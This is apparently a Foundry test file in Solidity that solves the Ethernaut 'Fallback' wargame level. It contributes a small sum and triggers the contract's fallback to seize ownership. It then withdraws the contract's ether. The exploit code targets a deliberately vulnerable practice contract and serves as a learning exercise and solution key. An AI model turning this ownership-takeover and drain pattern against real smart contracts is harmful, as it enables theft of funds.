pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Fallback/FallbackFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract FallbackTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // 1. contribute()
        // 2. fallback call
        // 3. withdraw()

        ethernautFallback.contribute{value: .0001 ether}();
        bytes4 selector = bytes4(keccak256("aFunctionThatDoesntExist()"));
        // emit log(string(selector));
        address(ethernautFallback).call{value: 1 wei}(
            abi.encodePacked(selector)
        );
        assertEq(ethernautFallback.owner(), eoaAddress, "NOT OWNER!");
        ethernautFallback.withdraw();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
